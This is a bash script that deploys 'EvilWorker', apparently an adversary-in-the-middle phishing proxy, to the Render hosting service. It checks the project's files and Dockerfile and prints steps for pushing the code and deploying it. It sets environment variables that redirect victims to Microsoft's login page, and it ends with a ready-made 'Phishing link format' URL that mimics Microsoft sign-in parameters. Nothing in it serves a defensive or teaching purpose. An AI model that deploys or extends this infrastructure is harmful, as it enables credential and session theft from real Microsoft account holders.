#!/bin/bash

# EvilWorker Render Deployment Script
# This script helps deploy EvilWorker to Render

set -e

echo "🚀 EvilWorker Render Deployment Script"
echo "======================================"

# Check if we're in the right directory
if [ ! -f "proxy_server.js" ]; then
    echo "❌ Error: proxy_server.js not found. Please run this script from the EvilWorker directory."
    exit 1
fi

# Check if required files exist
echo "📋 Checking required files..."
required_files=("proxy_server.js" "package.json" "Dockerfile" "render.yaml" "config.js")
for file in "${required_files[@]}"; do
    if [ -f "$file" ]; then
        echo "✅ $file found"
    else
        echo "❌ $file missing"
        exit 1
    fi
done

# Check if git is initialized
if [ ! -d ".git" ]; then
    echo "📦 Initializing git repository..."
    git init
    git add .
    git commit -m "Initial commit for Render deployment"
fi

# Check if remote repository is configured
if ! git remote get-url origin > /dev/null 2>&1; then
    echo "⚠️  No remote repository configured."
    echo "Please add your GitHub repository:"
    echo "git remote add origin https://github.com/yourusername/EvilWorker.git"
    echo ""
fi

# Validate Dockerfile
echo "🐳 Validating Dockerfile..."
if docker build --dry-run . > /dev/null 2>&1; then
    echo "✅ Dockerfile is valid"
else
    echo "❌ Dockerfile validation failed"
    exit 1
fi

# Check Node.js version
echo "📦 Checking Node.js version..."
node_version=$(node --version)
required_version="v22.15.0"
if [ "$(printf '%s\n' "$required_version" "$node_version" | sort -V | head -n1)" = "$required_version" ]; then
    echo "✅ Node.js version $node_version is compatible"
else
    echo "⚠️  Node.js version $node_version may not be compatible (recommended: $required_version)"
fi

echo ""
echo "🎯 Deployment Steps:"
echo "1. Push your code to GitHub:"
echo "   git add ."
echo "   git commit -m 'Prepare for Render deployment'"
echo "   git push origin main"
echo ""
echo "2. Deploy to Render:"
echo "   - Go to https://dashboard.render.com"
echo "   - Click 'New +' and select 'Blueprint'"
echo "   - Connect your GitHub repository"
echo "   - Render will automatically detect render.yaml and deploy"
echo ""
echo "3. Configure environment variables in Render dashboard:"
echo "   - ENABLE_CREDENTIAL_REDIRECT=true"
echo "   - CREDENTIALS_REDIRECT_URL=https://login.microsoftonline.com/"
echo "   - REDIRECT_DELAY=1000"
echo ""
echo "4. Your EvilWorker will be available at:"
echo "   https://your-service-name.onrender.com"
echo ""
echo "🔗 Phishing link format:"
echo "https://your-service-name.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
echo ""
echo "✅ Deployment script completed successfully!"
